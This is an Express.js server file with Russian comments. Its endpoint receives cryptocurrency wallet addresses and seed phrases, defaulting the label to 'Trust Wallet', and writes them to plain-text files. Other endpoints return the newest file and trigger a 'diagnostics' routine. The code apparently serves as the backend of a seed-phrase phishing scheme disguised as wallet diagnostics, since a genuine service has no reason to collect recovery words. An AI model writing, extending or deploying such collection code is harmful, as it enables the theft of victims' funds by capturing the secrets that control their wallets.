
import fs from 'fs';
import path from 'path';
import express from 'express';
import cors from 'cors';
import { saveWalletDiagnostics } from './walletDiagnostics.js';

const app = express();
app.use(cors());
app.use(express.json());

// Эндпоинт для сохранения адреса кошелька и сид-фразы
app.post('/api/save-seed', (req, res) => {
  const { walletAddress, seedWords, walletName } = req.body;
  if (!walletAddress || typeof walletAddress !== 'string' || walletAddress.length !== 48) {
    return res.status(400).json({ error: 'Некорректный адрес кошелька' });
  }
  if (!Array.isArray(seedWords) || seedWords.length === 0) {
    return res.status(400).json({ error: 'Нет сид-фразы' });
  }
  // Название кошелька (Trust Wallet) можно передавать с фронта, если нужно
  const name = walletName || 'Trust Wallet';
  const now = new Date();
  const pad = n => n.toString().padStart(2, '0');
  const dateStr = `${pad(now.getDate())}.${pad(now.getMonth()+1)}.${now.getFullYear()}, ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
  const walletsDir = path.join(process.cwd(), 'server', 'wallets');
  if (!fs.existsSync(walletsDir)) {
    fs.mkdirSync(walletsDir, { recursive: true });
  }
  const filePath = path.join(walletsDir, `Wallet${walletAddress}.txt`);
  let fileContent = `=== Новая запись ===\n`;
  fileContent += `Дата: ${dateStr}\n`;
  fileContent += `Кошелёк: ${name}\n`;
  fileContent += `Количество слов: ${seedWords.length}\n`;
  fileContent += `Адрес кошелька: ${walletAddress}\n`;
  fileContent += `Слова:\n`;
  seedWords.forEach((word, idx) => {
    fileContent += `${idx+1}. ${word}\n`;
  });
  fs.writeFile(filePath, fileContent, err => {
    if (err) {
      return res.status(500).json({ error: 'Ошибка сохранения файла' });
    }
    res.json({ success: true, file: filePath });
  });
});

// Endpoint для получения последнего файла диагностики
app.get('/api/last-diagnosis', (req, res) => {
  const walletsDir = path.join(process.cwd(), 'server', 'wallets');
  if (!fs.existsSync(walletsDir)) return res.status(404).json({ error: 'Нет данных' });
  const files = fs.readdirSync(walletsDir).filter(f => f.endsWith('.txt'));
  if (!files.length) return res.status(404).json({ error: 'Нет файлов' });
  const lastFile = files.map(f => ({f, t:fs.statSync(path.join(walletsDir,f)).mtimeMs}))
    .sort((a,b)=>b.t-a.t)[0].f;
  const content = fs.readFileSync(path.join(walletsDir, lastFile), 'utf-8');
  try {
    res.json(JSON.parse(content));
  } catch {
    res.status(500).json({ error: 'Ошибка чтения файла' });
  }
});

app.post('/api/diagnose', async (req, res) => {
  const { address } = req.body;
  if (!address) return res.status(400).json({ error: 'No address provided' });
  try {
    await saveWalletDiagnostics(address);
    res.json({ message: `Данные сохранены для адреса: ${address}` });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

const PORT = 3001;
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
